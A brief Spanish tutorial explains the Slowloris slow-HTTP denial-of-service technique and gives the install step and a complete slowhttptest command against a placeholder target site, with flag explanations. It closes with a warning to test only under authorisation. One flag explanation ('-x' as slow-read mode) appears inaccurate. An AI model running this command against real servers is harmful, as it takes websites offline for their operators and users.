# Ataque Slowloris con slowhttptest

Los ataques **Slowloris** o HTTP lentos se dirigen a la capa de aplicación de los servidores web. Un servidor mal configurado puede quedar inoperativo ante este tipo de tráfico.

## ¿Cómo funciona?

A diferencia de un ataque DoS por fuerza bruta que satura el ancho de banda, Slowloris utiliza solicitudes HTTP parciales para mantener abiertas las conexiones durante el mayor tiempo posible, agotando los recursos del servidor (como el pool de hilos o procesos).

**Analogía:** Imagina a 100 personas en una tienda contando historias largas al cajero para que nadie más pueda ser atendido.

## Instalación

```bash
apt install slowhttptest
```

## Ejecución del ataque

```bash
slowhttptest -c 500 -H -g -o ./resultado -i 10 -r 200 -t GET -u http://sitio-objetivo.com -x 24 -p 2
```

### Parámetros principales:

*   **`-c 500`**: Establece 500 conexiones simultáneas.
*   **`-H`**: Inicia en modo SlowLoris (solicitudes inacabadas).
*   **`-g`**: Genera reportes en CSV y HTML.
*   **`-o`**: Nombre del archivo de salida.
*   **`-i 10`**: Intervalo entre datos de seguimiento (segundos).
*   **`-r 200`**: Velocidad de conexión (conexiones por segundo).
*   **`-u`**: URL o IP del objetivo.
*   **`-x`**: Modo de lectura lenta (opcional).

> **Advertencia:** Realiza estas pruebas solo en entornos controlados o bajo autorización.

> **Nota:** NO memorices aprende practicando, que la genialidad es igual a la repetición.
